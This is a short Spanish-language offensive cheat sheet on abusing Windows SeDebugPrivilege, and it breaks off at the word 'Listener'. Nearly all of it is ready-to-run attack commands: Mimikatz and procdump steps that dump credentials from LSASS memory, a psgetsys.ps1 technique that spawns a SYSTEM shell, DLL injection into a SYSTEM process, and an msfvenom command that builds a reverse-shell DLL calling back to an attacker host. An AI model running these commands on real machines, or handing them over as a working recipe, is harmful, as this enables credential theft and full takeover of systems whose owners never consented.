Debug

Debug Este privilegio permite escalar privilegios de 3 formas diferentes: Volcar Hashes de LSASS: Permite ejecutar Mimikatz con privilegios para volcar hashes Token System: Permite modificar el payload de un proceso que corre como SYSTEM DLL Hijacking: Permite inyectar un payload a un proceso que corre como SYSTEM

SeDebugPrivilege permite abrir procesos de alto privilegio y leer o manipular memoria. Es especialmente sensible contra LSASS, pero puede estar bloqueado por EDR, PPL o políticas del sistema.

Volcar Hashes de LSASS

Volcar hashes del proceso LSASS directamente

mimikatz.exe # Iniciar Mimikatz
privilege::debug # Habilita privilegio SeDebugPrivilege
sekurlsa::logonpasswords # Extrae credenciales

Extraer lsass.dmp

procdump.exe -accepteula -ma lsass.exe lsass.dmp # Descargar lsass.dmp

Volcar lsass.dmp

# Kali
pypykatz lsa minidump <lsass.dmp>
# Windows
mimikatz.exe # Iniciar Mimikatz
privilege::debug # Habilita privilegio SeDebugPrivilege
sekurlsa::minidump lsass.dmp # Carga el dumpeo de la memoria
sekurlsa::logonpasswords # Extrae credenciales

Ruta de lsass.dmp: administrador de Tareas -> Details -> lsass.exe -> Create Dump File

Token System (RCE)

PsGetSystem

PowerShell

# Importamos el script
. .\psgetsys.ps1
# Buscar PID de un proceso ejecutado por SYSTEM normalmente como servicio
tasklist /v # Ej. winlogon.exe PID:612
# Abrir CMD como SYSTEM
.\psgetsys.ps1; [MyProcess]::CreateProcessFromParent(612,"c:\Windows\System32\cmd.exe", "")

Inyección DLL

Invoke-DllInjection.ps1

PowerShell

# Importamos el módulo
Import-Module Invoke-DllInjection.ps1
# Buscar PID de un proceso ejecutado por SYSTEM normalmente como servicio
tasklist /v # Ej. lsass PID: 476
# Inyectamos payload controlado en el proceso
Invoke-DllInjection -ProcessID <PID> -Dll C:\Users\rev.dll

Kali

# Creamos la rev_shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=443 -f dll -o rev.dll
# Listener
